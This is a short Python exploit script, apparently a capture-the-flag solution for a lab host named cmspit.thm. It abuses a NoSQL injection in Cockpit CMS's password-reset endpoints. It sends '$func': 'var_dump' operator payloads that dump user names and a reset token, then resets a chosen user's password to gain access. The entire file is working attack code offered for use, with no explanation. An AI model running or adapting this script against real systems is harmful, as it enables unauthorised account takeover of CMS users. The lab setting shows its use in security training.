#!/usr/bin/python3 

import requests
import re
url = "http://cmspit.thm/auth/"
def get_users():
	res = requests.post(url + "requestreset/",json={ "user" : { "$func" : "var_dump" } })
	users = re.findall('\".*\"', res.text)
	users = [user[1:-1] for user in users]
	users = users[:-1]
	return users

def get_reset_token():
	res = requests.post(url + "resetpassword/", json={"token": {"$func": "var_dump"}})	
	token = re.findall('\".*\"', res.text)
	token = token[0].replace('"', '')
	return token

def generate_token(user):
	print(f"Generating token for {user}...")
	requests.post(url + "requestreset/", json={"user":f"{user}"})

def reset_password(token, password):
	print("Resetting Password...")
	res = requests.post(url + "resetpassword/", json={"token":f"{token}", "password":f"{password}"})
	return "true" in res.text

def main():
	users = get_users()
	if not users:
		print("Failed to extract users")
		exit()
	print("Users Extracted: ")
	print(users)
	requested_user = str(input("Reset user's password: "))
	if not requested_user in users:
		print("Requested User does not exist!")
		exit()

	generate_token(requested_user)
	token = get_reset_token()
	if not token:
		print("Token retrieval failed!")
		exit()
	print("Got Token")
	print(token)

	newpass = str(input(f"Enter new password for {requested_user}: "))
	if reset_password(token, newpass):
		print(f"Password changed Successfully. Go log into {requested_user} with {newpass}")
	else:
		print(f"Password reset failed.")

if __name__ == "__main__":
	main()